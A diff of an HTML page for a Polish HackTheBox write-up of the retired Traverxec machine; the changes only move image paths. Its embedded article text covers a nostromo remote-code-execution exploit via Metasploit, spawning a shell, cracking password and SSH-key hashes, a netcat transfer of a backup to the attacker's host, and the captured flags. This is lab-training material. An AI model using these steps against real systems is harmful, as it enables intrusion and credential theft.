@@ -61,13 +61,13 @@
 <meta property="og:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://lavatann.github.io/posts/hackthebox/traverxec/" />
-<meta property="og:image" content="https://lavatann.github.io/Traverxec.png" /><meta property="article:section" content="posts" />
+<meta property="og:image" content="https://lavatann.github.io/thumbnails/Traverxec.png" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-08-02T00:00:00&#43;00:00" />
 <meta property="article:modified_time" content="2021-08-02T00:00:00&#43;00:00" />
 <meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/encrypted/devzat/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/logforge/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/devzat/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/shibboleth/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/backdoor/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/secret/" />
 
 <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="https://lavatann.github.io/Traverxec.png" />
+<meta name="twitter:image" content="https://lavatann.github.io/thumbnails/Traverxec.png" />
 <meta name="twitter:title" content="Traverxec - HackTheBox"/>
 <meta name="twitter:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)"/>
 
@@ -105,7 +105,7 @@
   "articleBody": "Traverxec - 02.08.2021  Nmap ┌──(kali㉿kali-os)-[~/htb/active] └─$ nmap -sC -sV 10.10.10.165 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-02 05:16 EDT Nmap scan report for 10.10.10.165 Host is up (0.17s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA) | 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA) |_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-server-header: nostromo 1.9.6 |_http-title: TRAVERXEC Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Msfconsole Szybkie sprawdzenie nostromo 1.9.6, okazuje się, że jest exploit na zdalne wykonywanie kodu.\nMsfconsole - exploit/multi/http/nostromo_code_exec\npython -c 'import pty; pty.spawn(\"/bin/sh\")'\n╔══════════╣ Analyzing Htpasswd Files (limit 70) -rw-r--r-- 1 root bin 41 Oct 25 2019 /var/nostromo/conf/.htpasswd david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/  Hashcat Start hashcata na modzie 500\nhashcat -m 500 david.hash /usr/share/wordlists/rockyou.txt Hasło .htpasswd złamane\ndavid:Nowonly4me\nSpojrzenie na układ nostromo. Można znaleźć tam ciekawy plik konfiguracyjny nhttpd.conf\n$ cat nhttpd.conf cat nhttpd.conf # MAIN [MANDATORY] servername traverxec.htb serverlisten * serveradmin david@traverxec.htb serverroot /var/nostromo servermimes conf/mimes docroot /var/nostromo/htdocs docindex index.html # LOGS [OPTIONAL] logpid logs/nhttpd.pid # SETUID [RECOMMENDED] user www-data # BASIC AUTHENTICATION [OPTIONAL] htaccess .htaccess htpasswd /var/nostromo/conf/.htpasswd # ALIASES [OPTIONAL] /icons /var/nostromo/icons # HOMEDIRS [OPTIONAL] homedirs /home homedirs_public public_www Nietypowa ścieżka domowa\nW kodzie zródłowym nic specjalnego nie było.\nJednak, gdy pogrzebiemy głębiej, znajdziemy ciekawy folder\nhomedirs /home homedirs_public public_www  Przesyłanie pliku backup.tgz za pomocą nc Victim\nnc 10.10.14.160 9000 Kali\nnc -lvnp 9000  backup.tgz Klucz id_rsa okazał się zaszyfrowany\n ssh2john Potrzebny był ssh2john.py\n/usr/share/john/ssh2john.py david.ssh Po chwili john znalazł klucz\njohn david_john.ssh --wordlist= /usr/share/wordlists/rockyou.txt hunter\nNależy nadać uprawnienia 600 kluczowi\nUdało się\nuser.txt\n7db0b48469606a42cec20750d9782f3d\n Priv Esc root.txt\n9aa36a6d76f785dfd320a478f6e0d906\n",
   "wordCount" : "267",
   "inLanguage": "en",
-  "image":"https://lavatann.github.io/Traverxec.png","datePublished": "2021-08-02T00:00:00Z",
+  "image":"https://lavatann.github.io/thumbnails/Traverxec.png","datePublished": "2021-08-02T00:00:00Z",
   "dateModified": "2021-08-02T00:00:00Z",
   "author":{
     "@type": "Person",
@@ -202,7 +202,7 @@
 
 </div>
   </header> 
-<figure class="entry-cover"><img loading="lazy" src="https://lavatann.github.io/Traverxec.png" alt="">
+<figure class="entry-cover"><img loading="lazy" src="https://lavatann.github.io/thumbnails/Traverxec.png" alt="">
         
 </figure><div class="toc">
     <details >
